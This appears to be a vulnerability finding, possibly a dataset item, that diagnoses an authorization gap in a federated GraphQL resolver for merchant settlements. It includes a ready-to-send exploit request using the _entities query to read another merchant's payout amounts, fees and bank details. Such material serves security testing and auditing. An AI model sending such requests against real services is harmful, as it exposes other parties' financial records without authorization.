diagnosis: The federated entity resolver for MerchantSettlement fetches settlement transaction records solely using the incoming representation.id. The merchantId header parsed in the Yoga context is never evaluated. Consequently, any authenticated merchant can probe other vendors' settlement amounts, fee deductions, and bank payout references via supergraph queries.
exploit_request:
POST /graphql HTTP/1.1
Host: settlement-service.payment.internal:5002
Content-Type: application/json
X-Merchant-Id: merch_8819

{"query": "query { _entities(representations: [{ __typename: \"MerchantSettlement\", id: \"stl_993041\" }]) { ... on MerchantSettlement { payoutBatchRef settlementAmount feeDeduction beneficiaryBankLast4 status } } }"}
